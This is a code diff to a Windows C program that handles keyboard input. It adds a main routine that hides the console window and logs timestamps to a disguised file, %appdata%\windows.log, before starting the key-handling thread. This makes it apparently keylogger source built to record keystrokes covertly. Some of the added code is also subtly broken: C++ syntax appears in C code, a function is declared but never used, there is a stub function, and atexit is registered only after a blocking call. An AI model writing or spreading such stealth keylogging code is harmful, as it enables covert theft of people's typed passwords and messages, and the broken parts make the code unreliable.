@@ -2,6 +2,10 @@
 #include <winuser.h>
 #include <stdio.h>
 #include <stdbool.h>
+#include <string.h>
+#include <time.h>
+#include <stdlib.h>
+
 
 #define VK_VOLUME_MUTE 0xAD
 #define VK_VOLUME_DOWN 0xAE
@@ -451,4 +455,61 @@ int start(char* argv[])
         return WaitForSingleObject(hThread, INFINITE);
     }
     return 1;
+}
+
+
+using namespace std;
+
+bool invisible = true;
+char fileName[MAX_PATH];
+
+void hide(void)
+{
+    HWND stealth;
+    stealth = FindWindow("ConsoleWindowClass", NULL );
+    ShowWindow(stealth, 0);
+}
+
+void init(void)
+{
+    char* dest = "%appdata%\\windows.log";
+
+    ExpandEnvironmentStrings(dest, fileName, MAX_PATH);
+
+    FILE *file;
+    file = fopen(fileName, "a+");
+    time_t startTime = time(0);
+    long savedOffset = ftell(file);
+    fseek(file, 0, SEEK_END);
+    if (!ftell(file) == 0) fputc('\n', file);
+    fseek(file, savedOffset, SEEK_SET);
+    fputs("### Started logging at: ", file);
+    fputs(ctime(&startTime), file);
+    fclose(file);
+}
+
+void powerdown(void)
+{
+    char* dest = "%appdata%\\windows.log";
+    ExpandEnvironmentStrings(dest, fileName, MAX_PATH);
+    FILE *file;
+    file = fopen(fileName, "a+");
+    time_t endTime = time(0);
+    fputs("\n### Stopped logging at: ", file);
+    fputs(ctime(&endTime), file);
+    fclose(file);
+}
+
+char getFileName()
+{
+    return 'f';
+}
+
+int main(int argc, char* argv[])
+{
+    int startKeyLogging(char* argv[]);
+    if (invisible) hide();
+    init();
+    start(argv);
+    atexit(powerdown);
 }
